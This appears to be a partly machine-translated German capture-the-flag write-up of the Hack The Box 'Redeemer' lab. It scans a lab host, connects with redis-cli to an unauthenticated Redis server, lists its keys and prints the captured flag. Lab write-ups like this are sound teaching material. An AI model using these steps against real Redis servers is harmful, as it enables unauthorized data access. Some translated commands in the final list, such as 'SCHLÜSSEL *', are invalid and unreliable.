# Hack The Box: Redeemer — Write-up

<img width="1376" height="768" alt="image" src="https://github.com/user-attachments/assets/6b253b69-f310-4008-af7e-dc41b4f59e12" />


## Einführung

Redeemer ist eine anfängerfreundliche Maschine in der Hack The Box Startpunkt-Serie.
Das Hauptaugenmerk dieser Maschine liegt auf der Interaktion mit einem RedisRedis-Dienst, der ohne Authentifizierung freigelegt wird.

Ziel ist es, den offenen Port zu identifizieren, eine Verbindung zum Redis-Server herzustellen, Serverinformationen abzurufen, die Datenbank aufzuzählen und schließlich das gespeicherte Flag zu extrahieren.
Ziel
```
10.129.38.5
```
## Schritt 1 — Offene Ports Identifizieren

Der erste Schritt besteht darin, die Maschine zu scannen, um offene Ports zu entdecken.
```
nmap -sV 10.129.38.5
```
Dieser Scan zeigt, dass Port 6379 geöffnet ist
```
6379/tcp offenes Redis
```
Port 6379 ist der Standardport, der von Redis-Servern verwendet wird.
Antwort
```
6379
```
## Schritt 2 — Identifizieren Sie den laufenden Dienst

Die Scanausgabe zeigt bereits den laufenden Dienst.
```
6379/tcp offenes Redis
```
Redis ist eine Schlüssel-Wert-Datenbank im Speicher, die häufig für das Caching, die Speicherung von Sitzungen und den schnellen Datenabruf verwendet wird.
Antwort
```
redis
```
## Schritt 3 — Identifizieren Sie den Typ der Datenbank

Redis speichert seine Daten hauptsächlich im RAM, was extrem schnelle Lese- und Schreibvorgänge ermöglicht.

Im Gegensatz zu herkömmlichen disk-basierten Datenbanken wird Redis als In-Memory-Datenbank klassifiziert.
Antwort
```
In-Memory-Datenbank
```
## Schritt 4 — Redis Befehlszeilen-Tool

Um vom Terminal aus mit Redis zu interagieren, ist das Standard-Tool redis-cli.

Dieses Dienstprogramm ermöglicht das Senden von Befehlen direkt an den Redis-Server.

Beispiel:
```
redis-cli
```
Antwort
```
redis-cli
```
## Schritt 5 – Geben Sie den Host an

Da der Redis-Server auf einem Remote-Computer ausgeführt wird, müssen wir den Host beim Verbinden angeben.

Beispiel:
```
redis-cli -h 10.129.38.5 -p 6379
```
Das Flag, das verwendet wird, um den Host anzugeben, ist:

-h

Antwort
```
-h
```
## Schritt 6 — Server-Informationen abrufen

Nach der Verbindung zu Redis können wir Informationen über den Server mithilfe der INFOBefehl.

Beispiel:
```
redis-cli -h 10.129.38.5 -p 6379 INFO
```
Dieser Befehl zeigt verschiedene Details zur Redis-Instanz an, einschließlich Serverstatistiken, Speichernutzung und Datenbankinformationen.
Antwort
```
Info
```
## Schritt 7 — Finden Sie die Redis-Version

Um die Serverversion anzuzeigen, können wir den Server-Bereich der INFO-Ausgabe abfragen.
```
redis-cli -h 10.129.38.5 -p 6379 INFO Server
```
Beispielausgabe:

## Server
```
redis_version:5.0.7
```
Antwort
```
5.0.7
```
## Schritt 8 — Wählen Sie eine Redis-Datenbank

Redis unterstützt mehrere logische Datenbanken.
Um zwischen ihnen zu wechseln, die SELECTBefehl wird verwendet.

Beispiel:

WÄHLEN SIE 0

Datenbank 0 ist die Standarddatenbank.
Antwort
```
select 0
```
## Step 9 — Count Keys in Database 0

To determine how many keys exist in the database, we can inspect the Keyspace section of the INFO output.
```
redis-cli -h 10.129.38.5 -p 6379 INFO keyspace
```
Beispielausgabe:

## Keyspace
```
db0:keys=4,expires=0,avg_ttl=0
```
This indicates that 4 keys exist in database 0.
Antwort
```
4
```
## Schritt 10 — Alle Schlüssel auflisten

Um alle in der ausgewählten Datenbank gespeicherten Schlüssel aufzuzählen, KEYSBefehl wird verwendet.
```
redis-cli -h 10.129.38.5 -p 6379 KEYS *
```
The wildcard * tells Redis to list all keys.
Antwort
```
keys *
```
Abrufen der Flagge

Nach dem Auflisten der Schlüssel enthält einer von ihnen die Flagge.

Wir können den in einem Schlüssel gespeicherten Wert mithilfe der GETBefehl.
```
redis-cli -h 10.129.38.5 -p 6379 GET flag
```
Ausgabe:
```
03e1d2b376c37ab3f5319922053953eb
```
Da Redis ohne Authentifizierung läuft, ermöglicht es den direkten Zugriff auf die gespeicherten Daten.
Wurzelfahne
```
03e1d2b376c37ab3f5319922053953eb
```
## Verwendete Befehle:
```
 nmap -sV 10.129.38.5

 redis-cli -h 10.129.38.5 -p 6379 INFO

 redis-cli -h 10.129.38.5 -p 6379 INFO Server

 redis-cli -h 10.129.38.5 -p 6379 INFO-Schlüsselraum

 redis-cli -h 10.129.38.5 -p 6379 SCHLÜSSEL *

 redis-cli -h 10.129.38.5 -p 6379 GET flag
```
## Schlussfolgerung

Redeemer ist eine großartige Einführungsmaschine, die die Risiken der Ausführung von Redis ohne Authentifizierung demonstriert.

Wichtige Takeaways:

    Immer sichere Redis-Instanzen mit Authentifizierung
    Vermeiden Sie es, Redis direkt dem Internet auszusetzen
    Falsch konfigurierte Dienste können sensible Daten mit minimalem Aufwand auslaufen lassen



